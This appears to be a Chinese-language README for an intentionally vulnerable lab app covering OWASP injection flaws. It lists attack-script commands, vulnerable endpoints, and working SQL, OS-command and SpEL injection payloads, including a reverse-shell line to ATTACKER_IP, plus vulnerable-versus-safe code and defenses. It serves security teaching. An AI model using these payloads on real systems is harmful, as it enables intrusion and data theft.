# OWASP A03:2021 - Injection 注入攻擊

## 概述

A03:2021 注入攻擊是 OWASP Top 10 中最危險的漏洞之一。當應用程式將不受信任的資料作為命令或查詢的一部分發送到解釋器時，就會發生注入攻擊。

## 涵蓋的漏洞類型

| 漏洞類型 | CWE | 攻擊腳本 | 風險等級 |
|---------|-----|---------|---------|
| SQL Injection | CWE-89 | sql_injection.py | 🔴 嚴重 |
| OS Command Injection | CWE-78 | command_injection.py | 🔴 嚴重 |
| ORM/HQL Injection | CWE-564 | orm_injection.py | 🟠 高 |
| Expression Language Injection | CWE-917 | expression_injection.py | 🔴 嚴重 |

## 攻擊腳本使用

### 1. SQL Injection (sql_injection.py)

SQL 注入攻擊，包含認證繞過、UNION-based、Error-based 等技術。

```bash
# 認證繞過攻擊
python3 sql_injection.py --auth-bypass

# UNION-based 注入
python3 sql_injection.py --union

# Error-based 注入
python3 sql_injection.py --error

# 直接 SQL 執行（危險端點）
python3 sql_injection.py --report

# 資料庫結構探索
python3 sql_injection.py --schema

# Time-based 盲注說明
python3 sql_injection.py --time-based

# 執行所有攻擊
python3 sql_injection.py --all

# 比較漏洞/安全版本
python3 sql_injection.py --compare
```

### 2. OS Command Injection (command_injection.py)

作業系統命令注入，透過 ping、nslookup 等端點執行任意命令。

```bash
# Ping 端點注入
python3 command_injection.py --ping

# DNS Lookup 注入
python3 command_injection.py --lookup

# 任意命令執行
python3 command_injection.py --info

# Log 檔案讀取 + 路徑穿越
python3 command_injection.py --log

# 網路診斷多參數注入
python3 command_injection.py --diagnose

# 反向 Shell 說明
python3 command_injection.py --reverse-shell

# 執行所有攻擊
python3 command_injection.py --all
```

### 3. ORM/HQL Injection (orm_injection.py)

ORM 層的注入攻擊，展示即使使用 ORM 框架也可能存在注入風險。

```bash
# HQL 查詢注入
python3 orm_injection.py --hql

# Field 名稱注入
python3 orm_injection.py --field

# ORDER BY 注入
python3 orm_injection.py --orderby

# 提取所有用戶資料
python3 orm_injection.py --extract

# 執行所有攻擊
python3 orm_injection.py --all
```

### 4. Expression Language Injection (expression_injection.py)

Spring Expression Language (SpEL) 注入，可導致 RCE。

```bash
# 基本 SpEL 注入
python3 expression_injection.py --basic

# RCE via SpEL
python3 expression_injection.py --rce

# 環境變數提取
python3 expression_injection.py --env

# 模板注入 (SSTI)
python3 expression_injection.py --template

# 動態屬性存取
python3 expression_injection.py --property

# 執行所有攻擊
python3 expression_injection.py --all
```

## 漏洞端點

### SQL Injection

| 端點 | 方法 | 漏洞參數 | 說明 |
|------|------|---------|------|
| `/api/auth/login` | POST | username, password | 認證 SQL 注入 |
| `/api/products/search` | GET | keyword | 商品搜尋注入 |
| `/api/search/products` | GET | keyword, category, sortBy | 進階搜尋注入 |
| `/api/search/users` | GET | query, field | HQL 注入 |
| `/api/search/orders` | GET | status, userId, dateFrom | 訂單搜尋注入 |
| `/api/search/report` | POST | sql | 直接 SQL 執行 |
| `/api/search/tables` | GET | schema | Schema 資訊洩露 |

### OS Command Injection

| 端點 | 方法 | 漏洞參數 | 說明 |
|------|------|---------|------|
| `/api/system/ping` | GET | host | Ping 命令注入 |
| `/api/system/lookup` | GET | domain | DNS 查詢注入 |
| `/api/system/info` | GET | cmd | 任意命令執行 |
| `/api/system/read-log` | GET | filename | 檔案讀取 + 路徑穿越 |
| `/api/system/diagnose` | POST | target, ports, tool | 多參數注入 |

### Expression Language Injection

| 端點 | 方法 | 漏洞參數 | 說明 |
|------|------|---------|------|
| `/api/template/eval` | GET | expression | SpEL 直接執行 |
| `/api/template/render` | POST | template | 模板注入 |
| `/api/template/format` | POST | format, args | 格式化注入 |
| `/api/template/property` | GET | path | 動態屬性存取 |
| `/api/template/check` | POST | condition | 條件表達式注入 |

## SQL Injection Payloads

### 認證繞過
```sql
' OR '1'='1' --
admin'--
' OR 1=1 --
```

### UNION-based
```sql
' UNION SELECT id,username,password,email,null,null,null,null,null,null FROM users--
' UNION SELECT 1,version(),3,4,5,6,7,8,9,10--
```

### Error-based (PostgreSQL)
```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INTEGER)--
' AND 1=CAST((SELECT version()) AS INTEGER)--
```

### Time-based Blind (PostgreSQL)
```sql
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (LENGTH((SELECT username FROM users LIMIT 1))=5) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## Command Injection Payloads

### 命令串接
```bash
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
```

### 命令替換
```bash
$(whoami)
`id`
```

### Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## SpEL Injection Payloads

### 基本執行
```java
T(java.lang.Runtime).getRuntime().exec('id')
```

### 有輸出的 RCE
```java
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next()
```

### 環境變數
```java
T(java.lang.System).getenv()
T(java.lang.System).getProperty('user.home')
```

## 漏洞版本 vs 安全版本

### SQL Injection

**漏洞版本：**
```java
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
entityManager.createNativeQuery(sql).getResultList();
```

**安全版本：**
```java
// 使用 JPA Repository（參數化查詢）
userRepository.findByUsername(username);

// 或使用參數綁定
entityManager.createQuery("SELECT u FROM User u WHERE u.username = :username")
    .setParameter("username", username)
    .getResultList();
```

### Command Injection

**漏洞版本：**
```java
String command = "ping -c 3 " + host;
ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command);
```

**安全版本：**
```java
// 輸入驗證
if (!isValidHost(host)) {
    return error("Invalid host");
}
// 使用參數陣列，不經過 shell
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", host);
```

### Expression Language Injection

**漏洞版本：**
```java
Expression exp = parser.parseExpression(userInput);
Object result = exp.getValue();
```

**安全版本：**
```java
// 完全禁用用戶輸入的表達式
// 或使用安全的算術解析器
if (containsDangerousPatterns(userInput)) {
    return error("Expression not allowed");
}
```

## 防護建議

### SQL Injection
1. **使用參數化查詢** - 始終使用 PreparedStatement 或 JPA 參數綁定
2. **使用 ORM 框架** - 正確使用 JPA/Hibernate，避免字串拼接
3. **輸入驗證** - 驗證和過濾用戶輸入
4. **最小權限原則** - 資料庫帳號只給予必要權限

### Command Injection
1. **避免執行系統命令** - 盡可能使用程式庫替代
2. **輸入白名單** - 只允許預定義的輸入值
3. **不使用 shell** - 直接執行命令，不經過 shell
4. **參數化執行** - 使用參數陣列而非字串拼接

### Expression Language Injection
1. **禁用用戶輸入** - 不允許用戶提供表達式
2. **沙箱執行** - 限制可用的類別和方法
3. **輸入過濾** - 過濾危險關鍵字如 T(), Runtime, System
4. **使用安全的替代方案** - 使用簡單的模板引擎

## 參考資料

- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-917: Expression Language Injection](https://cwe.mitre.org/data/definitions/917.html)
- [CWE-564: Hibernate Injection](https://cwe.mitre.org/data/definitions/564.html)
- [Spring Expression Language (SpEL)](https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions)
